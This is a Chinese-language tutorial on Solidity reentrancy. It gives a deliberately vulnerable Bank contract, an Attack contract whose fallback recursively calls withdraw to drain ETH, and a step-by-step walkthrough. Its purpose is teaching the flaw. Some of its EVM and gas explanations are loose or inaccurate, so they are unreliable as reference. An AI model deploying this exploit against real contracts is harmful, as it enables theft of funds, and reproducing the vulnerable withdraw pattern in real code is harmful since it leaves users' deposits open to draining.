## 重入漏洞 reentrancy

* https://www.bilibili.com/video/BV1fP41137VD/ （1/2）
* https://www.bilibili.com/video/BV11e411M79g/ （2/2）

```
------ 正常业务流程:
- 合约balance == 10 ETH
- 用户balance == 1 ETH
- 用户取款调用withdraw(), 提款1 ETH到EOA

solidity中，给合约转账的时候，实际调用一个带有value参数的无名函数，在无名函数中先收款再调用fallback
这个value参数就是msg.value带来的转账金额。

------ 收款合约无名函数：
function (msg.data, msg.value){ 
	//msg.data 调用时传入的参数，包括函数签名等, msg.value 转账金额
	receiveFund(); // 执行收款
	fallback(); 
}

------ EVM中调用合约函数的方式：
当contract A调用contract B的funcB()时：
在同一个EVM中执行，解释器会把contract B的funcB()加载到contract A中，类似组装一起

------ 三种转账方式区别：
在solidity 0.8以后修复了一些问题
transfer(): 携带2300gas, 转账操作需要固定2100gas, 所以递归失败，此函数执行失败会回退，类似require()
send(): 携带2300gas, 转账操作需要固定2100gas, 所以递归失败，此函数执行返回true/false
call(): 可以自定义携带gas, 如果不指定会带全部gas到被调用合约，其他同send
```

* 演示案例

```solidity
contract Bank{
	mapping(address=>uint) private balances; 
	
	function withdraw(uint _amount) external payable{ 
		/////// ---- 用户余额判断，要大于取款额
		require(balances[msg.sender] >= _amount, "balance is insufficient");
		/////// ---- 用call转账
		(bool sent,) = msg.sender.call{value:_amount}("");
		/////// ---- 判断是否成功，返回值sent
		require(sent, "transfer failed");
		/////// ---- 从用户在合约中的余额扣除取款额
		//这里还有一个整数溢出漏洞，如果递归扣款，会造成下溢
		balances[msg.sender] -= _amount;  
	}
	
	
	function deposit() external payable{
		balances[msg.sender] += msg.value;
	}
	function getBalance() external view returns(uint){
		return address(this).balance;
	}
	constructor payable{}
}
```

* 攻击合约

```solidity
contract Attack{
	Bank private bank; //target contract
	
	//_addr is victim contract, setup it when deploy contract 
	constructor(address payable _addr) payable{ 
		bank = Bank(_addr);	//instance of victim contract
	}
	
	function attack() external payable{ //launch attack by attacker
		bank.deposit{value:1 ether}();	//deposit 1 ETH
		bank.withdraw(1 ether);		//withdraw 1 ETH
	}
	fallback() external payable{ //当前合约收款时，或外部调用了不存在的函数时，会call fallback
		//target's balance >= 1 ether, withdraw ..
		if(address(bank).balance >= 1 ether){	
			bank.withdraw(1 ether);
		}
	}
	function getBalance() external view returns(uint){ //check balance
		return address(this).balance;
	}
}
```

* 流程如下：

```solidity
	function attack() external payable{  
		bank.deposit{value:1 ether}(); //第一步，call漏洞合约deposit存1 ETH到漏洞合约
		bank.withdraw(1 ether);	 // 第二步，call漏洞合约withdraw
	}
	fallback() external {  
			bank.withdraw(1 ether); //第五步，继续call漏洞合约withdraw
	}
	
	
	function withdraw(uint _amount) external payable{ 
		//第三步，判断balance是否大于等于取款金额_amount，因为已存1 ETH，所以没问题
		require(balances[msg.sender] >= _amount, "balance is insufficient");
		//第四步，转账给攻击合约，由于收款合约（这里是攻击合约）要执行2个操作，
		//即收款和fallback，所以这里收款1ETH后会跳到攻击合约的fallback
		(bool sent,) = msg.sender.call{value:_amount}("");
		require(sent, "transfer failed");
		//这句永远得不到执行，直到把token取光
		balances[msg.sender] -= _amount; 
	}
	
=============== 如果把他们组合到一起，相当于 ===============
	contract Bank{
		mapping(address=>uint) private balances;
		
		function withdraw(uint _amount) external payable{
			require(balances[msg.sender] >= _amount, "balance error");
			
			Attack.receiveFund(_amount);
			withdraw(_amount); //递归取款
			//never be exec
			balances[msg.sender] -= _amount;
		}
	}
```

